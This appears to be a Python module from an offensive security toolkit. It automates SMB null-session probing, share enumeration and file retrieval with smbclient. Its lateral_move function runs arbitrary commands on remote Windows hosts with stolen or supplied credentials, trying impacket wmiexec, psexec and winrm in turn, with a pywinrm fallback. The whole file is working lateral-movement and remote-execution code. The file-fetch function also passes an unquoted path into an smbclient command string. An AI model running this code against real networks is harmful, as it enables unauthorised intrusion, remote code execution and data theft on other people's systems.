import re
import subprocess
from typing import Any, Dict, List, Optional

from tools.log_utils import get_logger

logger = get_logger("smb_lateral")

_SHARE_LINE = re.compile(r"^\s*(\S+)\s+(Disk|IPC|Printer)\b", re.IGNORECASE)


def _parse_shares(output: str) -> List[str]:
    shares = []
    for line in output.splitlines():
        match = _SHARE_LINE.match(line)
        if match:
            shares.append(match.group(1))
    return shares


def _smb_error(output: str) -> bool:
    return "NT_STATUS_" in output.upper()


def smb_null_session(target: str) -> Dict:
    result = {"success": False, "method": "null_session", "shares": []}
    try:
        r = subprocess.run(
            ["smbclient", "-N", "-L", f"//{target}/", "-c", "quit"],
            capture_output=True,
            text=True,
            timeout=15,
        )
        output = r.stdout + r.stderr
        if r.returncode == 0 and not _smb_error(output):
            result["success"] = True
            result["raw_output"] = output[:500]
            result["shares"] = _parse_shares(output)
    except FileNotFoundError:
        result["error"] = "smbclient not installed"
    except Exception as e:
        result["error"] = str(e)
    return result


def smb_enum_shares(target: str, user: str = "", password: str = "") -> Dict:
    result: Dict[str, Any] = {"success": False, "shares": []}
    try:
        auth = f"-U{user}%{password}" if user else "-N"
        r = subprocess.run(
            ["smbclient", auth, "-L", f"//{target}/", "-c", "quit"],
            capture_output=True,
            text=True,
            timeout=15,
        )
        output = r.stdout + r.stderr
        if r.returncode != 0 or _smb_error(output):
            result["error"] = output.strip()[:300] or "smbclient failed"
            return result
        result["shares"] = _parse_shares(output)
        result["success"] = bool(result["shares"])
    except FileNotFoundError:
        result["error"] = "smbclient not installed"
    except Exception as e:
        result["error"] = str(e)
    return result


def smb_get_file(target: str, share: str, path: str, user: str = "", password: str = "") -> Dict:
    result = {"success": False, "content": ""}
    try:
        auth = f"-U{user}%{password}" if user else "-N"
        r = subprocess.run(
            ["smbclient", auth, f"//{target}/{share}", "-c", f"get {path} -", "quit"],
            capture_output=True,
            text=True,
            timeout=15,
        )
        output = (r.stdout or "") + (r.stderr or "")
        if r.returncode != 0 or _smb_error(output):
            result["error"] = output.strip()[:300] or "smbclient get failed"
            return result
        if r.stdout:
            result["success"] = True
            result["content"] = r.stdout[:5000]
        else:
            result["error"] = "empty file or read failed"
    except FileNotFoundError:
        result["error"] = "smbclient not installed"
    except Exception as e:
        result["error"] = str(e)
    return result


def wmi_exec(target: str, command: str, user: str, password: str, domain: str = ".") -> Dict:
    result = {"success": False, "method": "wmi_exec", "output": ""}
    try:
        cmd = [
            "impacket-wmiexec",
            f"{domain}/{user}:{password}@{target}",
            command,
        ]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            result["success"] = True
            result["output"] = r.stdout.strip()[:1000]
        else:
            result["error"] = (r.stderr or r.stdout).strip()[:300] or "wmiexec failed"
    except FileNotFoundError:
        result["error"] = "impacket not installed"
    except Exception as e:
        result["error"] = str(e)
    return result


def psexec(target: str, command: str, user: str, password: str, domain: str = ".") -> Dict:
    result = {"success": False, "method": "psexec", "output": ""}
    try:
        cmd = [
            "impacket-psexec",
            f"{domain}/{user}:{password}@{target}",
            command,
        ]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            result["success"] = True
            result["output"] = r.stdout.strip()[:1000]
        else:
            result["error"] = (r.stderr or r.stdout).strip()[:300] or "psexec failed"
    except FileNotFoundError:
        result["error"] = "impacket not installed"
    except Exception as e:
        result["error"] = str(e)
    return result


def winrm_exec(target: str, command: str, user: str, password: str, domain: str = ".") -> Dict:
    result = {"success": False, "method": "winrm", "output": ""}
    try:
        cmd = [
            "impacket-winrm",
            f"{domain}/{user}:{password}@{target}",
            command,
        ]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            result["success"] = True
            result["output"] = r.stdout.strip()[:1000]
        else:
            result["error"] = (r.stderr or r.stdout).strip()[:300] or "winrm failed"
    except FileNotFoundError:
        try:
            import winrm as pywinrm

            session = pywinrm.Session(f"http://{target}:5985/wsman", auth=(user, password))
            r = session.run_cmd(command)
            if r.status_code == 0:
                result["success"] = True
                result["output"] = r.std_out.decode()[:1000]
        except ImportError:
            result["error"] = "winrm or impacket not installed"
        except Exception as e:
            result["error"] = str(e)
    except Exception as e:
        result["error"] = str(e)
    return result


def lateral_move(
    target: str,
    command: str,
    user: str,
    password: str,
    methods: Optional[List[str]] = None,
    domain: str = ".",
) -> Dict:
    methods = methods or ["wmi", "psexec", "winrm"]
    results = {}
    for method in methods:
        if method == "wmi":
            r = wmi_exec(target, command, user, password, domain)
        elif method == "psexec":
            r = psexec(target, command, user, password, domain)
        elif method == "winrm":
            r = winrm_exec(target, command, user, password, domain)
        else:
            continue
        results[method] = r
        if r["success"]:
            return {
                "target": target,
                "success": True,
                "method": method,
                "output": r["output"],
                "all_results": results,
            }
    return {"target": target, "success": False, "all_results": results}
